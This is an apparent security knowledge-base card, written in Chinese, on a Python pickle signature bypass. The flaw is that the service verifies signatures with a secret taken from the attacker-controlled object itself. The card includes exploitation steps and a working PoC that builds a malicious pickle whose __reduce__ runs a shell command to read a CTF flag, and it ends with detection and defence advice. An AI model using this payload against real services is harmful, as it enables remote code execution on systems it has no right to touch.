---
id: web-python-deserialization-pickle-self-secret-signature-bypass
title: Python pickle 使用被反序列化对象自带的 secret 验签，攻击者自签名后 pickle.loads RCE
type: scenario
domain: web
path: web/python/deserialization
technique: pickle-self-secret-signature-bypass
tags:
- python
- pickle
- deserialization
- signature-bypass
- self-referential-secret
- rce
- php
- multi-stage
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:33:41+08:00'
  notes: 已对照原文双生序列段与图22核对：外层对象自带的 secret 先反序列化后用于验签、固定密钥 kaqikaqi、payload 内层 pickle.loads 的 __reduce__ 执行命令、PHP Writer/Shark/Bridge 多阶段铺路及最终 flag 回显均与原文叙述一致。原文未完整展示 pytools.py/api.php/run.php 源码，卡片已注明细节需按目标复核并标 confidence medium。原文未涉及版本区间。PoC 未在本机执行。
url: /docs/web/python/deserialization/web-python-deserialization-pickle-self-secret-signature-bypass/
draft: false
kb_aliases:
- pickle 验签密钥自取
- 自签名 pickle RCE
- secret 来自反序列化对象
- 固定密钥签名绕过
- 双生序列
---

## 一句话结论

Python 服务先反序列化攻击者数据、再从该对象读取 `secret` 字段并用它校验同一份数据的签名，等于让攻击者自带验签密钥；把 `secret` 设为应用固定密钥、把 `payload` 设为恶意 pickle，即可通过校验并触发 `pickle.loads` 任意代码执行。

## 原理

- 安全的反序列化流程应当是“先用可信密钥验签，验签通过后才反序列化”；目标是反过来的：先 `pickle.loads` 外层对象，取出对象里的 `secret`，再拿这个 `secret` 去校验 `payload` 的签名，最后 `pickle.loads(payload)`。
- 因为 `secret` 就来自攻击者提交的对象，攻击者可以把它设成任何值。若签名算法和密钥在源码中可见（原文 PHP 端写死 `kaqikaqi`），攻击者只需让 `secret = b"kaqikaqi"`，签名校验必然通过。
- 校验通过后，`payload` 直接进入 `pickle.loads`，没有类白名单或 `find_class` 限制；构造 `__reduce__` 返回 `(exec, ("import os;...",))`，即可在反序列化时执行任意 Python。
- 外层对象只需是一个普通类（如 `Set`），带 `secret` 与 `payload` 两个属性；`pickle.loads` 会按模块/类名还原它，因此攻击者本地定义同名类即可生成合法字节流。
- 该设计把“完整性校验”建立在同一份不可信输入上，校验形同虚设；固定密钥进一步降低了门槛。

## 触发条件

- Python 服务对用户可控数据执行 `pickle.loads`（外层对象）；
- 验签密钥/`secret` 从该外层对象读取，而不是从服务端配置或可信存储读取；
- 内层 `payload` 在验签通过后被 `pickle.loads`，且未限制可反序列化的类；
- 攻击者能提交外层对象（直接接口，或经由 PHP/其他语言的中间链写入文件）。

## 利用步骤

1. 审计 Python 端：确认先反序列化外层对象、读取 `secret`、再验签并 `pickle.loads(payload)`。
2. 找到签名密钥来源：源码固定值、配置或可预测值（原文为 `kaqikaqi`）。
3. 定义与服务端同名的外层类（如 `Set`），设置 `secret = b"kaqikaqi"`，`payload = pickle.dumps(恶意 RCE 对象)`。
4. 生成外层 pickle 并 base64；通过直接接口或中间链写入目标期望的文件（原文为 `write.bin`，签名由 PHP `Writer` 用同一固定密钥生成到 `write.meta`）。
5. 触发 Python 服务加载并 `pickle.loads`；恶意对象的 `__reduce__` 执行命令，将结果写入可回显位置。

## PoC

构造恶意 pickle（Python）：

```python
import pickle, base64

class Set:
    def __init__(self):
        self.secret = b"kaqikaqi"   # 与 PHP/服务端固定密钥一致
        self.payload = b""

class RCE:
    def __reduce__(self):
        return (exec, ("import os;os.system('cat /flag > /tmp/ssxl/outs.txt')",))

outer = Set()
outer.payload = pickle.dumps(RCE())
print(base64.b64encode(pickle.dumps(outer)).decode())
```

服务端校验逻辑等价于：

```python
obj = pickle.loads(untrusted)          # 外层对象，攻击者可控
secret = obj.secret                    # 验签密钥来自不可信输入
if verify_signature(obj.payload, secret, meta):  # 攻击者可自签名
    pickle.loads(obj.payload)          # RCE
```

原文的多阶段链：PHP `index.php` 存序列化数据 → `api.php` 反序列化 `Bridge` 触发 `Writer` 写 `write.bin`/`write.meta`、`Shark` 写 `run.bin` → `run.php` 反序列化 `Pytools` 调起 `python3 pytools.py` → Python 用对象内 `secret` 验签后 `pickle.loads`，最终 `cat /flag`。成功标志为页面回显 flag。

## 变体与关联

- 变体：密钥不是固定值而是从对象读取时，攻击者仍可自设任意值；若签名算法可离线复现，直接自己生成 `write.meta`。
- 变体：即使外层不是 pickle，而是 JSON/表单，只要 `secret` 字段与待验数据同源，问题相同。
- 变体：`pickle.loads` 可换 `yaml.load`（unsafe）、`torch.load` 等同样支持对象构造的反序列化。
- 关联：[[web-php-deserialization-compressed-phar-include-bypass]]（PHP 反序列化入口）；[[web-php-rce-create-function-callback-gadget]]（PHP 侧代码执行 gadget）。
- 边界：若密钥来自服务端环境变量、签名覆盖 `secret` 本身、或 `pickle.loads` 使用受限 `Unpickler.find_class`，本链不成立；原文部分源码未完整展示，实现细节需按目标复核。

## 检测与防御

- 检测：代码中出现 `pickle.loads` 嵌套；验签密钥取自被反序列化对象；`write.bin`/`write.meta` 等由外部写入的二进制文件。
- 检测：请求/中间文件包含 base64 的 `gAS...` pickle 魔数；Python 进程执行 `cat`/`os.system` 等异常子进程。
- 防御：绝不 `pickle.loads` 不可信数据；必须使用时用 `Unpickler.find_class` 白名单或改用 JSON。
- 加固：验签密钥只从服务端可信配置读取，签名覆盖包括 `secret` 与 `payload` 在内的完整消息；先验签后反序列化；中间文件目录不可被 Web 写入。
